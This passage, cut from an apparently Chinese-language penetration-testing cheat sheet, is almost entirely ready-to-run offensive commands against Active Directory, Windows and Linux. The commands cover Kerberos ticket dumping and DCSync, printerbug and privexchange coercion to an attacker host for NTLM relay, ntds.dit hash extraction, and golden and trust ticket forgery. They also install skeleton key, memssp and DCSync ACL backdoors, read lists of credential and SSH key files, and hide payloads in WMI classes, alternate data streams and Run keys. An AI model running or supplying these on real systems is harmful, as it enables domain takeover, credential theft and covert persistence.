dump /luid:0xdeadbeef /nowrap </code></th></tr></thead></table><h3 id="查找非约束委派主机"><a href="#查找非约束委派主机" class="headerlink" title="查找非约束委派主机"></a><u><font style="color:#000000;">查找非约束委派主机</font></u></h3><table><thead><tr><th><code>plain Get-NetComputer -Unconstrained  Get-DomainComputer -Unconstrained -Properties DnsHostName  MATCH (c:Computer &#123;unconstraineddelegation:true&#125;) RETURN c  MATCH (u:User &#123;owned:true&#125;), (c:Computer &#123;unconstraineddelegation:true&#125;), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p </code></th></tr></thead></table><h2 id="4-约束委派"><a href="#4-约束委派" class="headerlink" title="4.约束委派"></a><font style="color:#000000;">4.约束委派</font></h2><h3 id="获取票据-1"><a href="#获取票据-1" class="headerlink" title="获取票据"></a><u><font style="color:#000000;">获取票据</font></u></h3><table><thead><tr><th><code>plain privilege::debug sekurlsa::tickets /export sekurlsa::tickets /  Rubeus dump /service:krbtgt /nowrap  Rubeus dump /luid:0xdeadbeef /nowrap </code></th></tr></thead></table><h3 id="查找约束委派主机"><a href="#查找约束委派主机" class="headerlink" title="查找约束委派主机"></a><u><font style="color:#000000;">查找约束委派主机</font></u></h3><table><thead><tr><th><code>plain Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo  MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]-&gt;(t)) RETURN p  MATCH (u:User &#123;owned:true&#125;), (c:Computer &#123;name: &quot;&lt;MYTARGET.FQDN&gt;&quot;&#125;), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p </code></th></tr></thead></table><h2 id="5-基于资源的约束委派"><a href="#5-基于资源的约束委派" class="headerlink" title="5.基于资源的约束委派"></a><font style="color:#000000;">5.基于资源的约束委派</font></h2><h2 id="6-dcsync"><a href="#6-dcsync" class="headerlink" title="6.dcsync"></a><font style="color:#000000;">6.dcsync</font></h2><table><thead><tr><th><code>plain lsadump::dcsync /domain:htb.local /user:krbtgt # Administrators, Domain Admins, Enterprise Admins  组下的账户都行 </code></th></tr></thead></table><h2 id="7-打印机-SpoolService-漏洞利用"><a href="#7-打印机-SpoolService-漏洞利用" class="headerlink" title="7.打印机 SpoolService 漏洞利用"></a><font style="color:#000000;">7.打印机 SpoolService 漏洞利用</font></h2><p>| <code>plain rpcdump.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;domain_server&gt; | grep MS-RPRN printerbug.py &#39;&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;&#39;@&lt;Printer IP&gt; &lt;RESPONDERIP&gt; </code>  |<br>| — |</p><h2 id="8-AD域ACL攻击-aclpwn-py"><a href="#8-AD域ACL攻击-aclpwn-py" class="headerlink" title="8.AD域ACL攻击(aclpwn.py)"></a><font style="color:#000000;">8.AD域ACL攻击(aclpwn.py)</font></h2><table><thead><tr><th><code>plain GenericAll on User GenericAll on Group GenericAll / GenericWrite / Write on Computer WriteProperty on Group Self (Self-Membership) on Group WriteProperty (Self-Membership) ForceChangePassword WriteOwner on Group GenericWrite on User WriteDACL + WriteOwner </code></th></tr></thead></table><h2 id="9-获取LAPS管理员密码"><a href="#9-获取LAPS管理员密码" class="headerlink" title="9.获取LAPS管理员密码"></a><font style="color:#000000;">9.获取LAPS管理员密码</font></h2><p>| <code>plain Get-LAPSPasswords -DomainController &lt;ip_dc&gt; -Credential &lt;domain&gt;\&lt;login&gt; | Format-Table -AutoSize  foreach ($objResult in $colResults)&#123;$objComputer = $objResult.Properties; $objComputer.name|where &#123;$objcomputer.name -ne $env:computername&#125;|%&#123;foreach-object &#123;Get-AdmPwdPassword -ComputerName $_&#125;&#125;&#125; </code>  |<br>| — |</p><h2 id="10-privexchange漏洞"><a href="#10-privexchange漏洞" class="headerlink" title="10.privexchange漏洞"></a><font style="color:#000000;">10.privexchange漏洞</font></h2><table><thead><tr><th><code>plain python privexchange.py -ah &lt;attacker_host_or_ip&gt; &lt;exchange_host&gt; -u &lt;user&gt; -d &lt;domain&gt; -p &lt;password&gt;  ntlmrelayx.py -t ldap://&lt;dc_fqdn&gt;--escalate-user &lt;user&gt; </code></th></tr></thead></table><h5 id="Exchange的利用"><a href="#Exchange的利用" class="headerlink" title="Exchange的利用"></a><font style="color:#000000;">Exchange的利用</font></h5><ul><li><a href="https://github.com/Ridter/Exchange2domain"><font style="color:#000000;">Exchange2domain</font></a></li><li><a href="https://github.com/WyAtu/CVE-2018-8581/"><font style="color:#000000;">CVE-2018-8581</font></a></li><li><a href="https://github.com/Ridter/CVE-2019-1040"><font style="color:#000000;">CVE-2019-1040</font></a></li><li><a href="https://github.com/Ridter/CVE-2020-0688"><font style="color:#000000;">CVE-2020-0688</font></a></li><li><a href="https://github.com/Arno0x/NtlmRelayToEWS"><font style="color:#000000;">NtlmRelayToEWS</font></a></li><li><a href="https://github.com/3gstudent/ewsManage"><font style="color:#000000;">ewsManage</font></a></li><li><a href="https://github.com/h4x0r-dz/CVE-2021-26855"><font style="color:#000000;">CVE-2021-26855</font></a></li><li><a href="https://gist.github.com/testanull/9ebbd6830f7a501e35e67f2fcaa57bda"><font style="color:#000000;">CVE-2021-28482</font></a></li></ul><h2 id="11-IPC"><a href="#11-IPC" class="headerlink" title="11.IPC"></a><font style="color:#000000;">11.IPC</font></h2><table><thead><tr><th><code>plain net use \\ip\ipc$ &quot;password&quot; /user:&quot;administrator&quot; net use \\ip\c$ &quot;password&quot; /user:&quot;administrator&quot; </code></th></tr></thead></table><h2 id="12-其他横移"><a href="#12-其他横移" class="headerlink" title="12.其他横移"></a><font style="color:#000000;">12.其他横移</font></h2><table><thead><tr><th><code>plain 1.向WSUS服务器数据库注入恶意程序更新WSUSpendu.ps1 # 需要先拿下 WSUS 更新分发服务器  2.MSSQL Trusted Linksuse exploit/windows/mssql/mssql_linkcrawler  3.GPO Delegation  4.ADCS </code></th></tr></thead></table><h1 id="10-权限维持"><a href="#10-权限维持" class="headerlink" title="10.权限维持"></a><font style="color:#000000;">10.权限维持</font></h1><h2 id="拿到域控权限"><a href="#拿到域控权限" class="headerlink" title="拿到域控权限"></a><font style="color:#000000;">拿到域控权限</font></h2><p><font style="color:#000000;">dump ntds.dit 文件</font></p><table><thead><tr><th><code>plain crackmapexec smb 127.0.0.1 -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; --ntds  secretsdump.py &#39;&lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;&#39;@&lt;ip&gt;  ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\temp&quot; q q  secretsdump.py  -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract  windows/gather/credentials/domain_hashdump </code></th></tr></thead></table><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a><font style="color:#000000;">后门</font></h2><table><thead><tr><th><code>plain net group &quot;domain admins&quot; myuser /add /domain  Golden ticket（黄金票据）  Silver Ticket（白银票据）  DSRM 后门： PowerShell New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD  Skeleton Key： mimikatz &quot;privilege::debug&quot; &quot;misc::skeleton&quot; &quot;exit&quot;  自定义 SSP DLL： mimikatz &quot;privilege::debug&quot; &quot;misc::memssp&quot; &quot;exit&quot; C:\Windows\System32\kiwissp.log </code></th></tr></thead></table><h2 id="域信任关系"><a href="#域信任关系" class="headerlink" title="域信任关系"></a><font style="color:#000000;">域信任关系</font></h2><h3 id="子域攻击父域-SID-History版跨域黄金票据"><a href="#子域攻击父域-SID-History版跨域黄金票据" class="headerlink" title="子域攻击父域 - SID History版跨域黄金票据"></a><u><font style="color:#000000;">子域攻击父域 - SID History版跨域黄金票据</font></u></h3><p>| <code>plain Get-NetGroup -Domain &lt;domain&gt; -GroupName &quot;Enterprise Admins&quot; -FullData|select objectsid  mimikatz lsadump::trust  kerberos::golden /user:Administrator /krbtgt:&lt;HASH_KRBTGT&gt; /domain:&lt;domain&gt; /sid:&lt;user_sid&gt; /sids:&lt;RootDomainSID-519&gt; /ptt </code>  |<br>| — |</p><h3 id="利用域信任密钥获取目标域的权限-信任票据"><a href="#利用域信任密钥获取目标域的权限-信任票据" class="headerlink" title="利用域信任密钥获取目标域的权限 - 信任票据"></a><u><font style="color:#000000;">利用域信任密钥获取目标域的权限 - 信任票据</font></u></h3><table><thead><tr><th><code>plain &quot;lsadump::trust /patch&quot; &quot;lsadump::lsa /patch&quot;  &quot;kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:   &lt;domain_SID&gt; /rc4:&lt;trust_key&gt; /service:krbtgt /target:&lt;target_domain&gt; /ticket: &lt;golden_ticket_path&gt;&quot; </code></th></tr></thead></table><h3 id="攻击其它林"><a href="#攻击其它林" class="headerlink" title="攻击其它林"></a><u><font style="color:#000000;">攻击其它林</font></u></h3><table><thead><tr><th><code>plain 利用ptintbug或petipotam漏洞使其它林的DC主动连接到本林的一台无约束委派主机，同时抓取发送过来的TGT，然后即可将它用于dcsync攻击 </code></th></tr></thead></table><h2 id="活动目录持久性技巧"><a href="#活动目录持久性技巧" class="headerlink" title="活动目录持久性技巧"></a><font style="color:#000000;">活动目录持久性技巧</font></h2><p><a href="https://adsecurity.org/?p=1929"><font style="color:#000000;">https://adsecurity.org/?p=1929</font></a><font style="color:#000000;"> </font><font style="color:#000000;">DS恢复模式密码维护 DSRM密码同步</font></p><p><strong><font style="color:#000000;">Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。KB961320:</font></strong><a href="https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,%E5%8F%AF%E5%8F%82%E8%80%83%EF%BC%9A[%E5%B7%A7%E7%94%A8DSRM%E5%AF%86%E7%A0%81%E5%90%8C%E6%AD%A5%E5%B0%86%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96](http://drops.xmd5.com/static/drops/tips-9297.html)"><font style="color:#000000;">https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：<a href="http://drops.xmd5.com/static/drops/tips-9297.html">巧用DSRM密码同步将域控权限持久化</a></font></a></p><p><a href="https://www.dcshadow.com/"><font style="color:#000000;">DCshadow</font></a></p><h5 id="Security-Support-Provider"><a href="#Security-Support-Provider" class="headerlink" title="Security Support Provider"></a><font style="color:#000000;">Security Support Provider</font></h5><p><font style="color:#000000;">简单的理解为SSP就是一个DLL，用来实现身份认证</font></p><table><thead><tr><th><code>plain privilege::debug misc::memssp </code></th></tr></thead></table><p><font style="color:#000000;">这样就不需要重启</font><font style="color:#000000;">c:&#x2F;windows&#x2F;system32</font><font style="color:#000000;">可看到新生成的文件kiwissp.log</font></p><h5 id="SID-History"><a href="#SID-History" class="headerlink" title="SID History"></a><a href="https://adsecurity.org/?p=1772"><font style="color:#000000;">SID History</font></a></h5><p><font style="color:#000000;">SID历史记录允许另一个帐户的访问被有效地克隆到另一个帐户</font></p><table><thead><tr><th><code>plain mimikatz &quot;privilege::debug&quot; &quot;misc::addsid bobafett ADSAdministrator&quot; </code></th></tr></thead></table><h5 id="AdminSDHolder＆SDProp"><a href="#AdminSDHolder＆SDProp" class="headerlink" title="AdminSDHolder＆SDProp"></a><a href="https://adsecurity.org/?p=1906"><font style="color:#000000;">AdminSDHolder＆SDProp</font></a></h5><p><font style="color:#000000;">利用AdminSDHolder＆SDProp（重新）获取域管理权限</font></p><h5 id="Dcsync后门"><a href="#Dcsync后门" class="headerlink" title="Dcsync后门"></a><font style="color:#000000;">Dcsync后门</font></h5><p><font style="color:#000000;">向域成员赋予Dcsync权限</font></p><table><thead><tr><th><code>plain Powerview.ps1 Add-DomainObjectAcl -TargetIdentity &quot;DC=vulntarget,DC=com&quot; -PrincipalIdentity test1 -Rights DCSync -Verbose </code></th></tr></thead></table><p><font style="color:#000000;">在登录了test1域账户的机器上执行Dcsync利用操作</font></p><table><thead><tr><th><code>plain mimikatz &quot;lsadump::dcsync /domain:vulntarget.com /all /csv&quot; </code></th></tr></thead></table><h5 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a><font style="color:#000000;">组策略</font></h5><p><a href="https://adsecurity.org/?p=2716"><font style="color:#000000;">https://adsecurity.org/?p=2716</font></a><font style="color:#000000;"> </font><a href="https://www.anquanke.com/post/id/86531"><font style="color:#000000;">策略对象在持久化及横向渗透中的应用</font></a></p><h5 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a><font style="color:#000000;">Hook PasswordChangeNotify</font></h5><p><a href="http://www.vuln.cn/6812"><font style="color:#000000;">http://www.vuln.cn/6812</font></a></p><h5 id="Kerberoasting后门"><a href="#Kerberoasting后门" class="headerlink" title="Kerberoasting后门"></a><font style="color:#000000;">Kerberoasting后门</font></h5><p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting"><font style="color:#000000;">域渗透-Kerberoasting</font></a></p><h5 id="AdminSDHolder"><a href="#AdminSDHolder" class="headerlink" title="AdminSDHolder"></a><font style="color:#000000;">AdminSDHolder</font></h5><p><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence"><font style="color:#000000;">Backdooring AdminSDHolder for Persistence</font></a></p><h5 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a><font style="color:#000000;">Delegation</font></h5><p><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence"><font style="color:#000000;">Unconstrained Domain Persistence</font></a></p><p><font style="color:#000000;">证书伪造：</font><font style="color:#000000;"> </font><a href="https://github.com/Ridter/pyForgeCert"><font style="color:#000000;">pyForgeCert</font></a></p><h1 id="11-敏感文件"><a href="#11-敏感文件" class="headerlink" title="11.敏感文件"></a><font style="color:#000000;">11.敏感文件</font></h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a><font style="color:#000000;">windows</font></h2><p><font style="color:#000000;">敏感配置文件</font></p><table><thead><tr><th><code>plain C:\boot.ini     //查看系统版本 C:\Windows\System32\inetsrv\MetaBase.xml    //IIS配置文件 C:\Windows\repair\sam     //存储系统初次安装的密码 C:\Program Files\mysql\my.ini     //Mysql配置 C:\Program Files\mysql\data\mysql\user.MYD    //Mysql root C:\Windows\php.ini    //php配置信息 C:\Windows\my.ini     //Mysql配置信息 C:\Windows\win.ini    //Windows系统的一个基本系统配置文件 </code></th></tr></thead></table><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a><font style="color:#000000;">Linux</font></h2><p><font style="color:#000000;">敏感配置文件</font></p><table><thead><tr><th><code>bash #判断是否在docker容器内 /proc/1/cgroup  # 系统版本 cat /etc/issue  # 内核版本 cat /proc/version  # 账户密码 cat /etc/passwd cat /etc/shadow  # 环境变量 cat /etc/profile  # 系统应用(命令) ls -lah/sbin  # 安装应用(命令) la -lah /usr/bin  # 开机自启 cat /etc/crontab  # history cat ~/.bash_history cat ~/.nano_history cat ~/.atftp_history cat ~/.mysql_history cat ~/.php_history  # 网络配置 cat /etc/resolv.conf cat /etc/networks cat /etc/network/interfaces cat /etc/sysconfig/network cat /etc/host.conf cat /etc/hosts cat /etc/dhcpd.conf  # Service配置 cat /etc/apache2/apache2.conf cat /etc/httpd/conf/httpd.conf cat /etc/httpd/conf/httpd2.conf cat /var/apache2/config.inc cat /usr/local/etc/nginx/nginx.conf cat /usr/local/nginx/conf/nginx.conf cat /etc/my.cnf cat /etc/mysql/my.cnf cat /var/lib/mysql/mysql/user.MYD cat /etc/mongod.conf cat /usr/local/redis/redis.conf cat /etc/redis/redis.conf  # ftp cat /etc/proftpd.conf  # mail cat /var/mail/root cat /var/spool/mail/root cat ~/.fetchmailrc cat /etc/procmailrc cat ~/.procmailrc cat /etc/exim/exim.cf cat /etc/postfix/main.cf cat /etc/mail/sendmail.mc cat /usr/share/sendmail/cf/cf/linux.smtp.mc cat /etc/mail/sendmail.cf   # ssh cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key   # log ls /var/log cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat /var/www/logs/access_log cat /var/www/logs/access.log  # proc fuzz /proc/self/fd/32 /proc/self/fd/33 /proc/self/fd/34 /proc/self/fd/35 /proc/sched_debug /proc/mounts /proc/net/arp /proc/net/route /proc/net/tcp /proc/net/udp /proc/net/fib_trie /proc/version </code></th></tr></thead></table><h1 id="12-权限提升"><a href="#12-权限提升" class="headerlink" title="12.权限提升"></a><font style="color:#000000;">12.权限提升</font></h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a><font style="color:#000000;">Windows</font></h2><h3 id="bypass-UAC"><a href="#bypass-UAC" class="headerlink" title="bypass UAC"></a><u><font style="color:#000000;">bypass UAC</font></u></h3><h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a><font style="color:#000000;">常用方法</font></h5><ul><li><font style="color:#000000;">使用IFileOperation COM接口</font></li><li><font style="color:#000000;">使用Wusa.exe的extract选项</font></li><li><font style="color:#000000;">远程注入SHELLCODE 到傀儡进程</font></li><li><font style="color:#000000;">DLL劫持，劫持系统的DLL文件</font></li><li><font style="color:#000000;">eventvwr.exe and registry hijacking</font></li><li><font style="color:#000000;">sdclt.exe</font></li><li><font style="color:#000000;">SilentCleanup</font></li><li><font style="color:#000000;">wscript.exe</font></li><li><font style="color:#000000;">cmstp.exe</font></li><li><font style="color:#000000;">修改环境变量，劫持高权限.Net程序</font></li><li><font style="color:#000000;">修改注册表HKCU\Software\Classes\CLSID，劫持高权限程序</font></li><li><font style="color:#000000;">直接提权过UAC</font></li><li><font style="color:#000000;">……</font></li></ul><h5 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a><font style="color:#000000;">常用工具</font></h5><ul><li><a href="https://github.com/hfiref0x/UACME"><font style="color:#000000;">UACME</font></a></li><li><a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC"><font style="color:#000000;">Bypass-UAC</font></a></li><li><a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC/Yamabiko"><font style="color:#000000;">Yamabiko</font></a></li><li><font style="color:#000000;">…</font></li></ul><h4 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a><font style="color:#000000;">提权</font></h4><ul><li><font style="color:#000000;">windows内核漏洞提权</font></li></ul><p><strong><font style="color:#000000;">检测类:</font></strong><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester"><font style="color:#000000;">Windows-Exploit-Suggester</font></a><strong><font style="color:#000000;">,</font></strong><a href="https://github.com/brianwrf/WinSystemHelper"><font style="color:#000000;">WinSystemHelper</font></a><strong><font style="color:#000000;">,</font></strong><a href="https://github.com/bitsadmin/wesng"><font style="color:#000000;">wesng</font></a></p><p><strong><font style="color:#000000;">利用类:</font></strong><a href="https://github.com/SecWiki/windows-kernel-exploits"><font style="color:#000000;">windows-kernel-exploits</font></a><strong><font style="color:#000000;">，</font></strong><a href="https://github.com/AlessandroZ/BeRoot.git"><font style="color:#000000;">BeRoot</font></a></p><ul><li><font style="color:#000000;">服务提权</font></li></ul><p><strong><font style="color:#000000;">数据库服务，ftp服务等</font></strong></p><ul><li><font style="color:#000000;">WINDOWS错误系统配置</font></li><li><font style="color:#000000;">系统服务的错误权限配置漏洞</font></li><li><font style="color:#000000;">不安全的注册表权限配置</font></li><li><font style="color:#000000;">不安全的文件&#x2F;文件夹权限配置</font></li><li><font style="color:#000000;">计划任务</font></li><li><font style="color:#000000;">任意用户以NT AUTHORITY\SYSTEM权限安装msi</font></li><li><font style="color:#000000;">提权脚本</font></li></ul><p><a href="https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1"><font style="color:#000000;">PowerUP</font></a><strong><font style="color:#000000;">,</font></strong><a href="https://github.com/rsmudge/ElevateKit"><font style="color:#000000;">ElevateKit</font></a></p><h2 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a><font style="color:#000000;">Linux</font></h2><h4 id="内核溢出提权"><a href="#内核溢出提权" class="headerlink" title="内核溢出提权"></a><font style="color:#000000;">内核溢出提权</font></h4><p><a href="https://github.com/SecWiki/linux-kernel-exploits"><font style="color:#000000;">linux-kernel-exploits</font></a></p><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a><font style="color:#000000;">计划任务</font></h4><p>| <code>plain crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root </code>  |<br>| — |</p><h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a><font style="color:#000000;">SUID</font></h4><table><thead><tr><th><code>plain find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; </code></th></tr></thead></table><p><font style="color:#000000;">寻找可利用bin：</font><a href="https://gtfobins.github.io/"><font style="color:#000000;">https://gtfobins.github.io/</font></a></p><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a><font style="color:#000000;">环境变量</font></h4><table><thead><tr><th><code>plain cd /tmp echo “/bin/sh” &gt; ps chmod 777 ps echo $PATH export PATH=/tmp:$PATH cd /home/raj/script ./shell whoami </code></th></tr></thead></table><p><a href="https://xz.aliyun.com/t/2767"><font style="color:#000000;">Linux环境变量提权 - 先知社区)</font></a></p><h4 id="系统服务的错误权限配置漏洞"><a href="#系统服务的错误权限配置漏洞" class="headerlink" title="系统服务的错误权限配置漏洞"></a><font style="color:#000000;">系统服务的错误权限配置漏洞</font></h4><table><thead><tr><th><code>plain cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg </code></th></tr></thead></table><h4 id="不安全的文件-文件夹权限配置"><a href="#不安全的文件-文件夹权限配置" class="headerlink" title="不安全的文件&#x2F;文件夹权限配置"></a><font style="color:#000000;">不安全的文件&#x2F;文件夹权限配置</font></h4><table><thead><tr><th><code>plain cat ~/.bash_history cat ~/.nano_history cat ~/.atftp_history cat ~/.mysql_history cat ~/.php_history </code></th></tr></thead></table><h4 id="找存储的明文用户名，密码"><a href="#找存储的明文用户名，密码" class="headerlink" title="找存储的明文用户名，密码"></a><font style="color:#000000;">找存储的明文用户名，密码</font></h4><p>| <code>plain grep -i user [filename] grep -i pass [filename] grep -C 5 &quot;password&quot; [filename] find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla </code>  |<br>| — |</p><h1 id="13-权限维持"><a href="#13-权限维持" class="headerlink" title="13.权限维持"></a><font style="color:#000000;">13.权限维持</font></h1><h2 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a><font style="color:#000000;">Windows</font></h2><h5 id="1、密码记录工具"><a href="#1、密码记录工具" class="headerlink" title="1、密码记录工具"></a><font style="color:#000000;">1、密码记录工具</font></h5><p><font style="color:#000000;">WinlogonHack WinlogonHack 是一款用来劫取远程3389登录密码的工具，在 WinlogonHack 之前有 一个 Gina 木马主要用来截取 Windows 2000下的密码，WinlogonHack 主要用于截 取 Windows XP 以及 Windows 2003 Server。 键盘记录器 安装键盘记录的目地不光是记录本机密码，是记录管理员一切的密码，比如说信箱，WEB 网页密码等等，这样也可以得到管理员的很多信息。 NTPass 获取管理员口令,一般用 gina 方式来,但有些机器上安装了 pcanywhere 等软件，会导致远程登录的时候出现故障，本软件可实现无障碍截取口令。 Linux 下 openssh 后门 重新编译运行的sshd服务，用于记录用户的登陆密码。</font></p><h5 id="2、常用的存储Payload位置"><a href="#2、常用的存储Payload位置" class="headerlink" title="2、常用的存储Payload位置"></a><font style="color:#000000;">2、常用的存储Payload位置</font></h5><p><strong><font style="color:#000000;">WMI</font></strong><font style="color:#000000;"> </font><font style="color:#000000;">: 存储：</font></p><table><thead><tr><th><code>plain $StaticClass = New-Object Management.ManagementClass(&#39;root\cimv2&#39;, $null,$null) $StaticClass.Name = &#39;Win32_Command&#39; $StaticClass.Put() $StaticClass.Properties.Add(&#39;Command&#39; , $Payload) $StaticClass.Put() </code></th></tr></thead></table><p><font style="color:#000000;">读取:</font></p><table><thead><tr><th><code>plain $Payload=([WmiClass] &#39;Win32_Command&#39;).Properties[&#39;Command&#39;].Value </code></th></tr></thead></table><p><strong><font style="color:#000000;">包含数字签名的PE文件</font></strong><font style="color:#000000;"> </font><font style="color:#000000;">利用文件hash的算法缺陷，向PE文件中隐藏Payload，同时不影响该PE文件的数字签名</font><font style="color:#000000;"> </font><strong><font style="color:#000000;">特殊ADS</font></strong><font style="color:#000000;"> </font><font style="color:#000000;">…</font></p><table><thead><tr><th><code>plain type putty.exe &gt; ...:putty.exe wmic process call create c:\test\ads\...:putty.exe </code></th></tr></thead></table><p><font style="color:#000000;">特殊COM文件</font></p><table><thead><tr><th><code>plain type putty.exe &gt; \\.\C:\test\ads\COM1:putty.exe wmic process call create \\.\C:\test\ads\COM1:putty.exe </code></th></tr></thead></table><p><font style="color:#000000;">磁盘根目录</font></p><table><thead><tr><th><code>plain type putty.exe &gt;C:\:putty.exe  wmic process call create C:\:putty.exe </code></th></tr></thead></table><h5 id="3、Run-RunOnce-Keys"><a href="#3、Run-RunOnce-Keys" class="headerlink" title="3、Run&#x2F;RunOnce Keys"></a><font style="color:#000000;">3、Run&#x2F;RunOnce Keys</font></h5><p><font style="color:#000000;">用户级</font></p><table><thead><tr><th><code>plain HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce </code></th></tr></thead></table><p><font style="color:#000000;">管理员</font></p><table><thead><tr><th><code>plain HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run </code></th></tr></thead></table><h5 id="4、BootExecute-Key"><a href="#4、BootExecute-Key" class="headerlink" title="4、BootExecute Key"></a><font style="color:#000000;">4、BootExecute Key</font></h5><p><font style="color:#000000;">由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：</font></p><table><thead><tr><th><code>plain HKLM\SYSTEM\CurrentControlSet\Control\hivelist HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager </code></th></tr></thead></table><h5 id="5、Userinit-Key"><a href="#5、Userinit-Key" class="headerlink" title="5、Userinit Key"></a><font style="color:#000000;">5、Userinit Key</font></h5><p><font style="color:#000000;">WinLogon进程加载的login scripts,具体键值：</font></p><table><thead><tr><th><code>plain HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon </code></th></tr></thead></table><h5 id="6、Startup-Keys"><a href="#6、Startup-Keys" class="headerlink" title="6、Startup Keys"></a><font style="color:#000000;">6、Startup Keys</font></h5><table><thead><tr><th><code>plain HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders </code></th></tr></thead></table><h5 id="7、Services"><a href="#7、Services" class="headerlink" title="7、Services"></a><font style="color:#000000;">7、Services</font></h5><p><font style="color:#000000;">创建服务</font></p><table><thead><tr><th><code>plain sc create [ServerName] binPath= BinaryPathName </code></th></tr></thead></table><h5 id="8、Browser-Helper-Objects"><a href="#8、Browser-Helper-Objects" class="headerlink" title="8、Browser Helper Objects"></a><font style="color:#000000;">8、Browser Helper Objects</font></h5><p><font style="color:#000000;">本质上是Internet Explorer启动时加载的DLL模块</font></p><table><thead><tr><th><code>plain HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser 